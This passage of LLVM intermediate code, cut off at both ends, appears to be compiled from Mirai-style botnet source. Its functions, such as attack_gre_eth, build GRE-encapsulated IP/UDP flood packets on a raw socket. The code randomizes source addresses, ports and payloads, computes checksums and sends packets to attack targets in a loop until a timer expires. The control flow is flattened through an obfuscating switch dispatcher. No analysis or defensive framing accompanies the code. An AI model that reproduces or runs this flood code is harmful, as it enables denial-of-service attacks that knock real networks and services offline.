  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 24, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 -172529005, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -172529005, label %first
    i32 -433641195, label %87
    i32 41320740, label %88
    i32 -1436958210, label %94
    i32 1933976426, label %97
    i32 1478966248, label %98
    i32 -2113850009, label %104
    i32 85364357, label %155
    i32 1739922313, label %159
    i32 -803592638, label %209
    i32 -1501747605, label %213
    i32 -1855315451, label %222
    i32 1259891354, label %228
    i32 -478275442, label %236
    i32 687337905, label %252
    i32 -691539033, label %255
    i32 1393359727, label %256
    i32 8604905, label %257
    i32 781301251, label %263
    i32 -360544501, label %292
    i32 577658953, label %313
    i32 -1707892936, label %317
    i32 1429322396, label %321
    i32 940098276, label %326
    i32 -403378280, label %341
    i32 -2053899135, label %346
    i32 -130741733, label %352
    i32 -973510090, label %357
    i32 -2052401171, label %363
    i32 1914356210, label %367
    i32 1420075894, label %371
    i32 2082010276, label %377
    i32 -350343138, label %381
    i32 -1303423933, label %388
    i32 -772388089, label %455
    i32 988090950, label %458
    i32 1035486342, label %464
    i32 1347507502, label %465
    i32 -1103894875, label %466
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %85 = icmp eq i32 %.reload, -1
  %86 = select i1 %85, i32 -433641195, i32 41320740
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -1103894875, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %89 = load i32, i32* %12, align 4
  %90 = bitcast i32* %11 to i8*
  %91 = call i32 @setsockopt(i32 %89, i32 0, i32 3, i8* %90, i32 4) #6
  %92 = icmp eq i32 %91, -1
  %93 = select i1 %92, i32 -1436958210, i32 1933976426
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %12, align 4
  %96 = call i32 @close(i32 %95)
  store i32 -1103894875, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1478966248, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %11, align 4
  %100 = load i8, i8* %7, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  %103 = select i1 %102, i32 -2113850009, i32 -691539033
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %106 = load i8**, i8*** %13, align 8
  %107 = load i32, i32* %11, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8*, i8** %106, i64 %108
  store i8* %105, i8** %109, align 8
  %110 = load i8**, i8*** %13, align 8
  %111 = load i32, i32* %11, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8*, i8** %110, i64 %112
  %114 = load i8*, i8** %113, align 8
  %115 = bitcast i8* %114 to %struct.iphdr*
  store %struct.iphdr* %115, %struct.iphdr** %25, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i64 1
  %118 = bitcast %struct.iphdr* %117 to %struct.grehdr*
  store %struct.grehdr* %118, %struct.grehdr** %26, align 8
  %119 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %120 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %119, i64 1
  %121 = bitcast %struct.grehdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %27, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %28, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = and i8 %127, 15
  %129 = or i8 %128, 64
  store i8 %129, i8* %126, align 4
  %130 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, -16
  %134 = or i8 %133, 5
  store i8 %134, i8* %131, align 4
  %135 = load i8, i8* %14, align 1
  %136 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 1
  store i8 %135, i8* %137, align 1
  %138 = load i32, i32* %20, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 52, %139
  %141 = trunc i64 %140 to i16
  %142 = call zeroext i16 @htons(i16 zeroext %141) #7
  %143 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 2
  store i16 %142, i16* %144, align 2
  %145 = load i16, i16* %15, align 2
  %146 = call zeroext i16 @htons(i16 zeroext %145) #7
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 3
  store i16 %146, i16* %148, align 4
  %149 = load i8, i8* %16, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 5
  store i8 %149, i8* %151, align 4
  %152 = load i8, i8* %17, align 1
  %153 = icmp ne i8 %152, 0
  %154 = select i1 %153, i32 85364357, i32 1739922313
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 4
  store i16 %156, i16* %158, align 2
  store i32 1739922313, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 6
  store i8 47, i8* %161, align 1
  %162 = load i32, i32* %23, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 8
  store i32 %162, i32* %164, align 4
  %165 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i32 0, i32 1
  %170 = load i32, i32* %169, align 4
  %171 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 9
  store i32 %170, i32* %172, align 4
  %173 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %174 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %175 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %174, i32 0, i32 1
  store i16 %173, i16* %175, align 2
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = and i8 %178, 15
  %180 = or i8 %179, 64
  store i8 %180, i8* %177, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %182 = bitcast %struct.iphdr* %181 to i8*
  %183 = load i8, i8* %182, align 4
  %184 = and i8 %183, -16
  %185 = or i8 %184, 5
  store i8 %185, i8* %182, align 4
  %186 = load i8, i8* %14, align 1
  %187 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 1
  store i8 %186, i8* %188, align 1
  %189 = load i32, i32* %20, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 28, %190
  %192 = trunc i64 %191 to i16
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 2
  store i16 %193, i16* %195, align 2
  %196 = load i16, i16* %15, align 2
  %197 = zext i16 %196 to i32
  %198 = xor i32 %197, -1
  %199 = trunc i32 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 3
  store i16 %200, i16* %202, align 4
  %203 = load i8, i8* %16, align 1
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 5
  store i8 %203, i8* %205, align 4
  %206 = load i8, i8* %17, align 1
  %207 = icmp ne i8 %206, 0
  %208 = select i1 %207, i32 -803592638, i32 -1501747605
  store i32 %208, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  %210 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 4
  store i16 %210, i16* %212, align 2
  store i32 -1501747605, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 6
  store i8 17, i8* %215, align 1
  %216 = call i32 @rand_next()
  %217 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 8
  store i32 %216, i32* %218, align 4
  %219 = load i8, i8* %22, align 1
  %220 = icmp ne i8 %219, 0
  %221 = select i1 %220, i32 -1855315451, i32 1259891354
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  store i32 -478275442, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 8
  %231 = load i32, i32* %230, align 4
  %232 = sub i32 %231, 1024
  %233 = xor i32 %232, -1
  %234 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  store i32 -478275442, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i16, i16* %18, align 2
  %238 = call zeroext i16 @htons(i16 zeroext %237) #7
  %239 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i32 0, i32 0
  store i16 %238, i16* %240, align 2
  %241 = load i16, i16* %19, align 2
  %242 = call zeroext i16 @htons(i16 zeroext %241) #7
  %243 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 1
  store i16 %242, i16* %244, align 2
  %245 = load i32, i32* %20, align 4
  %246 = sext i32 %245 to i64
  %247 = add i64 8, %246
  %248 = trunc i64 %247 to i16
  %249 = call zeroext i16 @htons(i16 zeroext %248) #7
  %250 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 2
  store i16 %249, i16* %251, align 2
  store i32 687337905, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = load i32, i32* %11, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %11, align 4
  store i32 1478966248, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  store i32 1393359727, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 8604905, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %11, align 4
  %259 = load i8, i8* %7, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp slt i32 %258, %260
  %262 = select i1 %261, i32 781301251, i32 988090950
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8**, i8*** %13, align 8
  %265 = load i32, i32* %11, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds i8*, i8** %264, i64 %266
  %268 = load i8*, i8** %267, align 8
  store i8* %268, i8** %29, align 8
  %269 = load i8*, i8** %29, align 8
  %270 = bitcast i8* %269 to %struct.iphdr*
  store %struct.iphdr* %270, %struct.iphdr** %30, align 8
  %271 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i64 1
  %273 = bitcast %struct.iphdr* %272 to %struct.grehdr*
  store %struct.grehdr* %273, %struct.grehdr** %31, align 8
  %274 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %275 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %274, i64 1
  %276 = bitcast %struct.grehdr* %275 to %struct.iphdr*
  store %struct.iphdr* %276, %struct.iphdr** %32, align 8
  %277 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i64 1
  %279 = bitcast %struct.iphdr* %278 to %struct.udphdr*
  store %struct.udphdr* %279, %struct.udphdr** %33, align 8
  %280 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %281 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %280, i64 1
  %282 = bitcast %struct.udphdr* %281 to i8*
  store i8* %282, i8** %34, align 8
  %283 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %284 = load i32, i32* %11, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i64 %285
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %286, i32 0, i32 2
  %288 = load i8, i8* %287, align 4
  %289 = zext i8 %288 to i32
  %290 = icmp slt i32 %289, 32
  %291 = select i1 %290, i32 -360544501, i32 577658953
  store i32 %291, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 1
  %298 = load i32, i32* %297, align 4
  %299 = call i32 @ntohl(i32 %298) #7
  %300 = call i32 @rand_next()
  %301 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %302 = load i32, i32* %11, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i32 0, i32 2
  %306 = load i8, i8* %305, align 4
  %307 = zext i8 %306 to i32
  %308 = lshr i32 %300, %307
  %309 = add i32 %299, %308
  %310 = call i32 @htonl(i32 %309) #7
  %311 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 9
  store i32 %310, i32* %312, align 4
  store i32 577658953, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i32, i32* %23, align 4
  %315 = icmp eq i32 %314, -1
  %316 = select i1 %315, i32 -1707892936, i32 1429322396
  store i32 %316, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = call i32 @rand_next()
  %319 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 8
  store i32 %318, i32* %320, align 4
  store i32 1429322396, i32* %switchVar
  br label %loopEnd

; <label>:321:                                    ; preds = %loopEntry
  %322 = load i16, i16* %15, align 2
  %323 = zext i16 %322 to i32
  %324 = icmp eq i32 %323, 65535
  %325 = select i1 %324, i32 940098276, i32 -403378280
  store i32 %325, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  %327 = call i32 @rand_next()
  %328 = and i32 %327, 65535
  %329 = trunc i32 %328 to i16
  %330 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 3
  store i16 %329, i16* %331, align 4
  %332 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %333 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %332, i32 0, i32 3
  %334 = load i16, i16* %333, align 4
  %335 = zext i16 %334 to i32
  %336 = sub nsw i32 %335, 1000
  %337 = xor i32 %336, -1
  %338 = trunc i32 %337 to i16
  %339 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  store i32 -403378280, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i16, i16* %18, align 2
  %343 = zext i16 %342 to i32
  %344 = icmp eq i32 %343, 65535
  %345 = select i1 %344, i32 -2053899135, i32 -130741733
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  %347 = call i32 @rand_next()
  %348 = and i32 %347, 65535
  %349 = trunc i32 %348 to i16
  %350 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i32 0, i32 0
  store i16 %349, i16* %351, align 2
  store i32 -130741733, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i16, i16* %19, align 2
  %354 = zext i16 %353 to i32
  %355 = icmp eq i32 %354, 65535
  %356 = select i1 %355, i32 -973510090, i32 -2052401171
  store i32 %356, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = call i32 @rand_next()
  %359 = and i32 %358, 65535
  %360 = trunc i32 %359 to i16
  %361 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %362 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %361, i32 0, i32 1
  store i16 %360, i16* %362, align 2
  store i32 -2052401171, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load i8, i8* %22, align 1
  %365 = icmp ne i8 %364, 0
  %366 = select i1 %365, i32 1420075894, i32 1914356210
  store i32 %366, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = call i32 @rand_next()
  %369 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %370 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %369, i32 0, i32 9
  store i32 %368, i32* %370, align 4
  store i32 2082010276, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %373 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %372, i32 0, i32 9
  %374 = load i32, i32* %373, align 4
  %375 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 9
  store i32 %374, i32* %376, align 4
  store i32 2082010276, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = load i8, i8* %21, align 1
  %379 = icmp ne i8 %378, 0
  %380 = select i1 %379, i32 -350343138, i32 -1303423933
  store i32 %380, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = load i8*, i8** %34, align 8
  %383 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %382, i32 %383)
  %384 = load i8*, i8** %34, align 8
  %385 = load i32, i32* %20, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds i8, i8* %384, i64 %386
  store i8 0, i8* %387, align 1
  store i32 -1303423933, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 7
  store i16 0, i16* %390, align 2
  %391 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %392 = bitcast %struct.iphdr* %391 to i16*
  %393 = call zeroext i16 @checksum_generic(i16* %392, i32 20)
  %394 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %395 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %394, i32 0, i32 7
  store i16 %393, i16* %395, align 2
  %396 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 7
  store i16 0, i16* %397, align 2
  %398 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %399 = bitcast %struct.iphdr* %398 to i16*
  %400 = call zeroext i16 @checksum_generic(i16* %399, i32 20)
  %401 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 7
  store i16 %400, i16* %402, align 2
  %403 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %404 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %403, i32 0, i32 3
  store i16 0, i16* %404, align 2
  %405 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %406 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %407 = bitcast %struct.udphdr* %406 to i8*
  %408 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %409 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %408, i32 0, i32 2
  %410 = load i16, i16* %409, align 2
  %411 = load i32, i32* %20, align 4
  %412 = sext i32 %411 to i64
  %413 = add i64 8, %412
  %414 = trunc i64 %413 to i32
  %415 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %405, i8* %407, i16 zeroext %410, i32 %414)
  %416 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %417 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %416, i32 0, i32 3
  store i16 %415, i16* %417, align 2
  %418 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %419 = load i32, i32* %11, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i64 %420
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %421, i32 0, i32 0
  %423 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %422, i32 0, i32 0
  store i16 2, i16* %423, align 4
  %424 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 9
  %426 = load i32, i32* %425, align 4
  %427 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %428 = load i32, i32* %11, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i32 0, i32 0
  %432 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %431, i32 0, i32 2
  %433 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %432, i32 0, i32 0
  store i32 %426, i32* %433, align 4
  %434 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %435 = load i32, i32* %11, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i64 %436
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i32 0, i32 0
  %439 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %438, i32 0, i32 1
  store i16 0, i16* %439, align 2
  %440 = load i32, i32* %12, align 4
  %441 = load i8*, i8** %29, align 8
  %442 = load i32, i32* %20, align 4
  %443 = sext i32 %442 to i64
  %444 = add i64 52, %443
  %445 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %446 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %447 = load i32, i32* %11, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i64 %448
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %449, i32 0, i32 0
  %451 = bitcast %struct.sockaddr_in* %450 to %struct.sockaddr*
  store %struct.sockaddr* %451, %struct.sockaddr** %445, align 8
  %452 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %453 = load %struct.sockaddr*, %struct.sockaddr** %452, align 8
  %454 = call i64 @sendto(i32 %440, i8* %441, i64 %444, i32 16384, %struct.sockaddr* %453, i32 16)
  store i32 -772388089, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = load i32, i32* %11, align 4
  %457 = add nsw i32 %456, 1
  store i32 %457, i32* %11, align 4
  store i32 8604905, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = call i64 @time(i64* null) #6
  %460 = load i32, i32* %24, align 4
  %461 = sext i32 %460 to i64
  %462 = icmp sgt i64 %459, %461
  %463 = select i1 %462, i32 1035486342, i32 1347507502
  store i32 %463, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  store i32 -1103894875, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  store i32 1393359727, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %465, %464, %458, %455, %388, %381, %377, %371, %367, %363, %357, %352, %346, %341, %326, %321, %317, %313, %292, %263, %257, %256, %255, %252, %236, %228, %222, %213, %209, %159, %155, %104, %98, %97, %94, %88, %87, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
